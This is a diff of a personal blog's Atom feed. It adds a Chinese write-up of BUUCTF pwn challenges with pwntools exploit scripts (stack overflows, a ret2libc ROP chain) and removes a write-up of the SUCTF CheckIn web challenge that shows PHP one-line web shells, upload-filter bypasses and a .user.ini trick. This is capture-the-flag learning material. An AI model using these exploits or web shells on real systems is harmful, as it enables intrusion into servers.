@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>Cyurl3_BLOG</title>
-    <updated>2020-06-07T05:45:25.963Z</updated>
+    <updated>2020-06-14T04:19:54.680Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -10,6 +10,214 @@
     <logo>https://zhangzy999.github.io/images/avatar.png</logo>
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Cyurl3_BLOG</rights>
+    <entry>
+        <title type="html"><![CDATA[buuctf：pwn刷题记录（一）]]></title>
+        <id>https://zhangzy999.github.io/post/buu_pwn_1/</id>
+        <link href="https://zhangzy999.github.io/post/buu_pwn_1/">
+        </link>
+        <updated>2020-06-14T03:31:34.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="test_your_nc">test_your_nc</h2>
+<p>连接一下拿flag</p>
+<h2 id="rip">rip</h2>
+<p>简单运行一下看看程序的效果<br>
+<img src="https://zhangzy999.github.io//post-images/1592105587965.png" alt="" loading="lazy"><br>
+ida分析一下是栈溢出，我们确定偏移量<br>
+<img src="https://zhangzy999.github.io//post-images/1592105611254.png" alt="" loading="lazy"><br>
+然后找到system地址<br>
+<img src="https://zhangzy999.github.io//post-images/1592105636965.png" alt="" loading="lazy"><br>
+写exp</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# Author:CyurL3
+
+from pwn import *
+
+ip = 'node3.buuoj.cn'
+port = '26614'
+r = remote(ip,port)
+
+offset = 0xF + 0x8
+system_addr = 0x40118A
+
+payload = offset * 'A' + p64(system_addr)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p>##warmup_csaw_2016<br>
+看看程序功能<br>
+<img src="https://zhangzy999.github.io//post-images/1592105945920.png" alt="" loading="lazy"><br>
+检查一下程序保护机制发现啥也没开，直接ida确定偏移量<br>
+<img src="https://zhangzy999.github.io//post-images/1592105959786.png" alt="" loading="lazy"><br>
+发现system地址<br>
+<img src="https://zhangzy999.github.io//post-images/1592105988264.png" alt="" loading="lazy"><br>
+写exp</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# Author:CyurL3
+
+from pwn import *
+
+#filename = ''
+#procedure = './' + filename
+#sh = process(procedure)
+#elf = ELF(procedure)
+
+ip = 'node3.buuoj.cn'
+port = '25606'
+r = remote(ip,port)
+
+offset = 0x40 + 0x8
+
+r.recvuntil(':')
+cat_flag_addr = r.recvuntil('\n',drop = True)
+cat_flag_addr = int(cat_flag_addr,16)
+
+payload = offset * 'A' + p64(cat_flag_addr)
+
+r.recvuntil('&gt;')
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<h2 id="pwn1_sctf_2016">pwn1_sctf_2016</h2>
+<p>运行程序<br>
+<img src="https://zhangzy999.github.io//post-images/1592106307688.png" alt="" loading="lazy"><br>
+然后我们ida分析一下，可以发现是c++写的（枯了）<br>
+然后有个很奇怪的点，可以发现我们输入的字符不足以造成栈溢出<br>
+<img src="https://zhangzy999.github.io//post-images/1592106337646.png" alt="" loading="lazy"><br>
+不过下文好像是有那么一个把&quot;I&quot;替换成&quot;you&quot;的功能<br>
+<img src="https://zhangzy999.github.io//post-images/1592106374757.png" alt="" loading="lazy"><br>
+我们运行一下程序<br>
+<img src="https://zhangzy999.github.io//post-images/1592106425805.png" alt="" loading="lazy"><br>
+这样的话能把一个字符变成三个字符就能够进行溢出了<br>
+我们找system地址<br>
+<img src="https://zhangzy999.github.io//post-images/1592106459207.png" alt="" loading="lazy"><br>
+编写exp</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# Author:CyurL3
+
+from pwn import *
+
+ip = 'node3.buuoj.cn'
+port = '29955'
+r = remote(ip,port)
+
+offset = 0xC + 0x4 
+get_flag_addr = 0x08048F0D
+
+payload = 20 * 'I' + p32(get_flag_addr) + p32(get_flag_addr)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p>##ciscn_2019_n_1<br>
+运行程序<br>
+<img src="https://zhangzy999.github.io//post-images/1592106960725.png" alt="" loading="lazy"><br>
+进ida看看<br>
+<img src="https://zhangzy999.github.io//post-images/1592106975484.png" alt="" loading="lazy"><br>
+应该是让我们溢出v2的值，让v2等于11.28125就能cat flag<br>
+那么问题就是11.28125在内存是如何表示的？<br>
+有一张图参考一下，不是本题重点，可自行查阅一下浮点数在内存中的表示方法<br>
+<img src="https://zhangzy999.github.io//post-images/1592107268975.png" alt="" loading="lazy"><br>
+最终计算一下就是0x41348000<br>
+编写exp</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# Author:CyurL3
+
+from pwn import *
+
+ip = 'node3.buuoj.cn'
+port = '26369'
+r = remote(ip,port)
+
+offset = 0x2C
+
+payload = offset * 'A' + p64(0x41348000)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<h2 id="ciscn_2019_c_1">ciscn_2019_c_1</h2>
+<p>这个题比上面四个加起来还难=.=<br>
+我们运行一下程序，发现有三个功能，第一个功能就是一个加密的功能，第二个功能没用，程序让我们自己解密。。。第三个功能程序直接退出了<br>
+<img src="https://zhangzy999.github.io//post-images/1592107658336.png" alt="" loading="lazy"><br>
+ida发现加密函数是这样的<br>
+<img src="https://zhangzy999.github.io//post-images/1592107650559.png" alt="" loading="lazy"><br>
+然后puts函数会输出加密后的信息<br>
+这个题没有后门之类的函数，需要我们构造ROP链，那么我们首先要拿到system函数或者execve这样的函数的地址，用LibcSearcher来搞<br>
+再次之前我们先要获取puts函数的地址，由于puts函数只有一个参数，也就是rdi寄存器里的，那么我们来找一下pop rdi;ret这样的片段，发现是有这种片段的<br>
+<img src="https://zhangzy999.github.io//post-images/1592107809362.png" alt="" loading="lazy"><br>
+然而这个片段实际上是__libc_csu_init函数（一个初始化libc的函数）的片段，pop r15指令是三个16进制数，然而后两个十六进制数组合正好是pop rdi，也就是能用ROPgadget搜到的那个片段，由于我们只有一个参数，直接用那个片段来玩就行，不再展开用__libc_csu_init函数来构造ROP链了（wiki上有详细说明）<br>
+<img src="https://zhangzy999.github.io//post-images/1592108028058.png" alt="" loading="lazy"><br>
+注意我们的payload会被加密，两次异或加密后还是其本身，所以我们自己来写个解密函数好了，由于两次payload的长度一样，所以第二次发payload就不会再被加密了（用ida分析可知）<br>
+直接贴个exp吧，注意，第二次的payload有一个栈对齐，所以我们加上一个ret指令来进行对齐即可</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# Author:CyurL3
+
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+ip = 'node3.buuoj.cn'
+port = '27912'
+r = remote(ip,port)
+#sh = process('./ciscn_2019_c_1')
+elf = ELF('./ciscn_2019_c_1')
+
+offset = 0x58
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+gets_got = elf.got['gets']
+main_addr = elf.symbols['main']
+fregment_one = 0x400c7a
+fregment_two = 0x400c60
+pop_rdi_ret = 0x400c83
+bss_base = elf.bss()
+
+def encrypt(payload):
+    l = list(payload)
+    for i in range(len(l)):
+        if l[i].isdigit():
+            l[i] = chr(ord(l[i]) ^ 0xF)
+        elif l[i].isupper():
+            l[i] = chr(ord(l[i]) ^ 0xE)
+        elif l[i].islower():
+            l[i] = chr(ord(l[i]) ^ 0xD)
+    return ''.join(l)
+
+r.recvuntil('Input your choice!\n')
+r.sendline('1')
+r.recvuntil('Input your Plaintext to be encrypted\n')
+
+payload = offset * 'A' + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +p64(main_addr)
+payload = encrypt(payload)
+r.sendline(payload)
+
+r.recvuntil('Ciphertext\n')
+r.recvuntil('\n')
+puts_addr = u64(r.recvuntil('\n', drop=True).ljust(8,'\x00'))
+print 'puts_addr:' + hex(puts_addr)
+
+libc = LibcSearcher('puts',puts_addr)
+libcbase = puts_addr - libc.dump('puts')
+system_addr = libcbase + libc.dump('system')
+bin_sh_addr = libcbase + libc.dump('str_bin_sh')
+print 'system:' + hex(system_addr)
+
+r.recvuntil('Input your choice!\n')
+r.sendline('1')
+r.recvuntil('Input your Plaintext to be encrypted\n')
+
+ret_addr = 0x4006b9
+payload = offset * 'A' + p64(ret_addr)  + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) 
+#payload = encrypt(payload)
+r.sendline(payload)
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[格式化字符串漏洞学习总结]]></title>
         <id>https://zhangzy999.github.io/post/format_string_study/</id>
@@ -630,76 +838,6 @@ bingo!<br>
 <p>3，反引号里面的字符串不仅可以被当作命令执行，命令执行的结果还可被当作输入</p>
 <pre><code>?ip=1;cat$IFS$1`ls`   等价于    cat flag.php index.php
 </code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[BUUweb—checkIn，利用.user.ini上传木马]]></title>
-        <id>https://zhangzy999.github.io/post/webcheckIn/</id>
-        <link href="https://zhangzy999.github.io/post/webcheckIn/">
-        </link>
-        <updated>2020-05-15T02:17:05.000Z</updated>
-        <content type="html"><![CDATA[<p>先放上我向大佬学习的原文章：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">大佬文章</a><br>
-我们看看官方手册对于.ini文件的说明：<a href="https://www.php.net/manual/zh/configuration.file.per-user.php">官方PHP手册</a></p>
-<blockquote>
-<p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。<br>
-除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
-</blockquote>
-<p>我们可以看到下图中php.ini里面包含了非常多的php的配置，但是这些配置分成了四种：<br>
-<img src="https://zhangzy999.github.io//post-images/1589510286611.png" alt="" loading="lazy"><br>
-我们看看官方对于PHP_INI_*模式的定义：<br>
-<img src="https://zhangzy999.github.io//post-images/1589510381617.png" alt="" loading="lazy"><br>
-可以看到，在PHP_INI_USER模式中，是可以利用.user.ini修改设置的，然而，事实上，除了PHP_INI_SYSTEM外，其余三种模式都可以利用.user.ini来修改设置😶<br>
-但是相对敏感的配置选项，都是PHP_INI_SYSTEM模式，也就是说只能通过php.ini或者httpd.conf来设定......<br>
-8过，在php的配置中有两个灰常有意思的项：<br>
-<img src="https://zhangzy999.github.io//post-images/1589511354756.png" alt="" loading="lazy"><br>
-我们点进去看看这俩玩意到底是啥：<a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-append-file">php核心配置选项说明</a></p>
-<blockquote>
-<p>auto_append_file string:<br>
-Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.<br>
-The special value none disables auto-appending.<br>
-Note: If the script is terminated with exit(), auto-append will not occur.</p>
-</blockquote>
-<p>翻译成人话就是：可以在同目录下的php文件后面来一个类似于require()函数的功能解析指定的文件，但是php用exit()终止脚本的话，就不可以辣<br>
-auto_prepend_file就是在文件前解析<br>
-嗯……这俩功能是蛮强大的8，那么隐藏木马的思路就是先传个.user.ini，然后自动解析一张图片名，然后那个图片实际上是个图片马，这样就达成了目的，要求还是苛刻的，为啥呢？<br>
-首先，你在上传到的目录下得有php文件，这是前提要求<br>
-第二，当你用于隐藏后门的时候，你得能够上传的了.user.ini文件，也就是说防火墙允许你这样干……<br>
-看似苛刻，但是有的CTF赛题却可以用~<br>
-下面让我们来康康具体的应用8：[SUCTF 2019]CheckIn<br>
-打开环境是一张多么朴实无华的界面呵<br>
-<img src="https://zhangzy999.github.io//post-images/1589512236862.png" alt="" loading="lazy"><br>
-二话不说来给他干个一句话木马上去</p>
-<pre><code class="language-php">&lt;?php @eval($_POST['CyurL3']); ?&gt;
-</code></pre>
-<p><img src="https://zhangzy999.github.io//post-images/1589512360743.png" alt="" loading="lazy"><br>
-555,果然不可以，提示我们非法后缀，既然是后缀这块不通过，我们用特殊的来看看，比如双写php，大小写php，用特殊扩展名pht等方法都没办法绕过这个玩意，不信你看源代码嘛（事后出题师傅们放到github上的）<br>
-<img src="https://zhangzy999.github.io//post-images/1589513091150.png" alt="" loading="lazy"><br>
-可以看到只要是ph开头的都被干掉了，htaccess也被干掉了（小声bb：这块不太明白，不是只有apache服务器才能上传.htaccess文件吗，个人猜测当时比赛的时候出题方的服务器是apache，buu上的服务器应该就是nginx了8）<br>
-既然php不可以，那我们把后缀改成jpg试试😎<img src="https://zhangzy999.github.io//post-images/1589513590035.png" alt="" loading="lazy"><br>
-可以看到已经绕过了后缀名检测的机制，但是它告诉我们你的图片里不能有&quot;&lt;?&quot;这个东西哟😭<br>
-莫得事，我们可以用&lt;script&gt;标签来绕过</p>
-<pre><code class="language-javascript">&lt;script language=&quot;php&quot;&gt;eval($_POST['CyurL3']);&lt;/script&gt;
-</code></pre>
-<p>那么我们再上传一波来看看<br>
-<img src="https://zhangzy999.github.io//post-images/1589514478580.png" alt="" loading="lazy"><br>
-还是不行，它还有exif_imagetype这个东西的检测，百度一下知道它是php的一个函数，来读取一个图像的第一个字节并检查其签名，那我们伪造一波8，在前面加上gif的文件头“GIF”<br>
-<img src="https://zhangzy999.github.io//post-images/1589515289607.png" alt="" loading="lazy"><br>
-Ohhhh,上传成功辣<br>
-<img src="https://zhangzy999.github.io//post-images/1589515528926.png" alt="" loading="lazy"><br>
-但是怎么解析就是个大问题了没错吧，你可以看到，上传目录下面有index.php，叫什么名字不重要，重要的是有php文件，这个就很nice，我们上传个.user.ini，来包含下a.jpg，让它在php文件里面被解析<br>
-<img src="https://zhangzy999.github.io//post-images/1589515762119.png" alt="" loading="lazy"><br>
-这是.user.ini的内容，好了，我们可以上传一波康康<br>
-<img src="https://zhangzy999.github.io//post-images/1589515814991.png" alt="" loading="lazy"><br>
-没毛病，成功辽，进入上传文件目录到index.php页面里面，然后菜刀或者蚁剑连接木马，顺利找到flag！<br>
-<img src="https://zhangzy999.github.io//post-images/1589515871604.png" alt="" loading="lazy"><br>
-总结下嗷，.user.ini可以来帮助我们解析图片马<br>
-其优势吧，在于无论服务器是nginx/apache/IIS，只要是以fastcgi或者cgi运行的php都可以用这个方法来搞一搞，但是有个致命的要求，就是说你的上传目录文件下面得有php文件才可以……<br>
-再者，我们复现环境的时候，康康它的源码，其实有个地方做的很不合理，就是过滤掉&quot;&lt;?&quot;的内容，对于用户来说很不友好，因为很多的jpg文件里面的数据区有&quot;&lt;?&quot;这种符号，这样就导致了我们普通的图片也无法上传（亲测），综上，本题get到的技能点：<br>
-1，.user.ini来解析木马<br>
-2，&lt;script&gt;标签来绕过&quot;&lt;?&quot;的限制（其实绝大多数情况下script标签也不能用……）<br>
-3，用图片的文件头来绕过exif_imagetype()函数的检测<br>
-本文的最后附上github上的题目项目8：<a href="https://github.com/team-su/SUCTF-2019/blob/master/Web/checkIn/src/html/index.php">题目环境</a><br>
-如有错误，b站私信up主”yuyu-宇“指出嗷~</p>
 ]]></content>
     </entry>
 </feed>
